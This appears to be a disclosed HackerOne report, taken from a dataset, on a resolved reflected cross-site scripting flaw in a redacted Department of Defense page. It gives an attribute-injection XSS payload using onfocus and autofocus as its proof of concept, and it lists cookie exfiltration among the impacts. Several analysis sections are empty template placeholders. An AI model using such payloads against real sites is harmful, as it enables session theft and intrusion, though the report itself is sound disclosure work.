---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1457493'
original_report_id: '1457493'
title: Reflected XSS at https://██████████/████████ via "███████" parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2022-01-21T15:40:29.120Z'
disclosed_at: '2022-02-14T21:20:46.378Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at https://██████████/████████ via "███████" parameter

## Metadata

- HackerOne Report ID: 1457493
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2022-02-14T21:20:46.378Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

There is Reflected Cross site scripting issue at the following url:

https://████████/█████

Proof Of Concept

https://████/███?███=%22onfocus%3d%22alert(document.domain)%22autofocus%3d%22&submit=Search

███

Best Regards
@pelegn

## Impact

Cookies Exfiltration
SOAP Bypass
CORS Bypass
Executing javascript on the victim behalf

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Navigate to https://███████/████████?███████=%22onfocus%3d%22alert(document.domain)%22autofocus%3d%22&submit=Search

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
